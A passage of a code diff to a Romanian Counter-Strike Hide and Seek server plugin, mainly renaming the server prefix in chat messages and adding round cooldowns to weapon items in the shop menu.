+		return PLUGIN_HANDLED;
+	}
+
 	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
 	{
 		//ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );
@@ -808,14 +907,14 @@ public menu_handler_g ( id, menu, item )
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -824,21 +923,28 @@ public menu_handler_g ( id, menu, item )
 
 			cs_set_user_money ( id, cs_get_user_money ( id ) + 10 );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 10$^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 10$^x01 !" );
 		}
 
 		case 2:
 		{
+			if ( count2 [ id ] > 0 )
+			{
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );
+
+				return PLUGIN_HANDLED;
+			}
+
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -854,21 +960,23 @@ public menu_handler_g ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 3 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 USP 3GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 USP 3GL^x01 !" );
+
+			count2[id]=5;
 		}
 
 		case 3:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -888,21 +996,21 @@ public menu_handler_g ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 3 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 x3 HE + USP 2GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 x3 HE + USP 2GL^x01 !" );
 		}
 
 		case 4:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -913,28 +1021,28 @@ public menu_handler_g ( id, menu, item )
 
 			set_task ( 7.0, "RemoveInvis", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Invizibilitate 7S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 7S^x01 !" );
 		}
 
 		case 5:
 		{
-			if ( count2 [ id ] > 0 )
+			if ( count3 [ id ] > 0 )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Poti folosii^x03 M4A1^x01 odata la^x04 3^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 M4A1^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count3 [ id ], count3 [ id ] == 1 ? "a" : "e" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -950,30 +1058,30 @@ public menu_handler_g ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 3 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 M4A1 3GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 M4A1 3GL^x01 !" );
 
-			count2[id]=5
+			count3[id]=5;
 		}
 
 		case 6:
 		{
-			if ( count3 [ id ] > 0 )
+			if ( count4 [ id ] > 0 )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Poti folosii^x03 AK47^x01 odata la^x04 3^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count3 [ id ], count3 [ id ] == 1 ? "a" : "e" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AK47^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count4 [ id ], count4 [ id ] == 1 ? "a" : "e" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -995,30 +1103,30 @@ public menu_handler_g ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 3 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 AK47 3GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AK47 3GL^x01 !" );
 
-			count3[id]=5
+			count4[id]=5;
 		}
 
 		case 7:
 		{
 			if ( count [ id ] > 0 )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 3^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -1040,7 +1148,7 @@ public menu_handler_g ( id, menu, item )
 				cs_set_weapon_ammo ( eNtry, 3 );
 			}
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 AWP 3GL^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 3GL^x01 !" );
 
 			count [ id ] = 5;
 		}
@@ -1049,14 +1157,14 @@ public menu_handler_g ( id, menu, item )
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -1069,21 +1177,21 @@ public menu_handler_g ( id, menu, item )
 
 			set_task ( 7.0, "remove_speed", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 + 300 Viteza 7S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 + 300 Viteza 7S^x01 !" );
 		}
 
 		case 9:
 		{
 			if ( AlreadyChoosed [ id ] )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
 
 			if ( !is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -1094,7 +1202,7 @@ public menu_handler_g ( id, menu, item )
 
 			set_task ( 10.0, "remove_godmode", id );
 
-			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Godmode 10S^x01 !" );
+			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Godmode 10S^x01 !" );
 		}
 
 		case 10:
@@ -1103,7 +1211,7 @@ public menu_handler_g ( id, menu, item )
 			{
 				if ( incercari2 [ id ] == 3 )
 				{
-					ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 3^x01 ori !" );
+					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 3^x01 ori !" );
 
 					return PLUGIN_HANDLED;
 				}
@@ -1113,7 +1221,7 @@ public menu_handler_g ( id, menu, item )
 
 					ExecuteHamB ( Ham_CS_RoundRespawn, id );
 
-					ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinvier%s )", 2 - incercari2 [ id ], incercari2 [ id ] == 1 ? "e" : "i" );
+					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinvier%s )", 2 - incercari2 [ id ], incercari2 [ id ] == 1 ? "e" : "i" );
 
 					incercari2 [ id ] += 1;
 
@@ -1123,7 +1231,7 @@ public menu_handler_g ( id, menu, item )
 
 			else if ( is_user_alive ( id ) )
 			{
-				ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );
+				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );
 
 				return PLUGIN_HANDLED;
 			}
@@ -1138,7 +1246,7 @@ public RemoveInvis ( id )
 {
 	set_user_rendering ( id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 255 );
 
-	ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Acum esti dinou^x03 Vizibil^x01 !" );
+	ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Acum esti dinou^x03 Vizibil^x01 !" );
 }
 
 public remove_speed ( id )
@@ -1147,14 +1255,14 @@ public remove_speed ( id )
 	{
 		HaveSpeed [ id ] = false;
 
-		ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Nu mai ai^x03 + 300 Viteza^x01 !" );
+		ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 + 300 Viteza^x01 !" );
 	}
 
 	if ( HaveSpeed2 [ id ] )
 	{
 		HaveSpeed2 [ id ] = false;
 
-		ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Nu mai ai^x03 + 270 Viteza^x01 !" );
+		ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 + 270 Viteza^x01 !" );
 	}
 }
 
@@ -1162,7 +1270,7 @@ public remove_godmode ( id )
 {
 	set_user_godmode ( id, 0 );
 
-	ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Nu mai ai^x03 Godmode^x01 !" );
+	ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu mai ai^x03 Godmode^x01 !" );
 }
 
 public Event_CurWeapon ( id )
@@ -1178,16 +1286,13 @@ public Event_CurWeapon ( id )
 	}
 }
 
-public msgScoreAttrib ( const MsgId, const MsgType, const MsgDest )
+public msgScoreAttrib(msgid, dest, id)
 {
-	static id;
+    new id = get_msg_arg_int(1);
+    if( ( get_user_flags ( id ) & ADMIN_LEVEL_D ) || ( get_user_flags ( id ) & ADMIN_LEVEL_H ) || ( get_user_flags ( id ) & ADMIN_RCON ) && ( get_user_team ( id ) == 2 ))
+    	set_msg_arg_int(2, ARG_BYTE, is_user_alive(id) ? (1<<2) : (1<<0));
 
-	id = get_msg_arg_int ( 1 );
-
-	if( ( get_user_flags ( id ) & ADMIN_LEVEL_D ) || ( get_user_flags ( id ) & ADMIN_LEVEL_H ) || ( get_user_flags ( id ) & ADMIN_RCON ) && ( get_user_team ( id ) == 2 ) && !get_msg_arg_int ( 2 ) )
-	{
-		set_msg_arg_int ( 2, ARG_BYTE, ( 1 << 2 ) );
-	}
+    return PLUGIN_CONTINUE;
 }
 
 public client_disconnect ( id )
@@ -1202,8 +1307,10 @@ public client_disconnect ( id )
 	incercari2 [ id ] = 0;
 
 	count [ id ] = 0;
+
 	count2 [ id ] = 0;
 	count3 [ id ] = 0;
+	count4 [ id ] = 0;
 
 	if ( task_exists ( id ) )
 	{
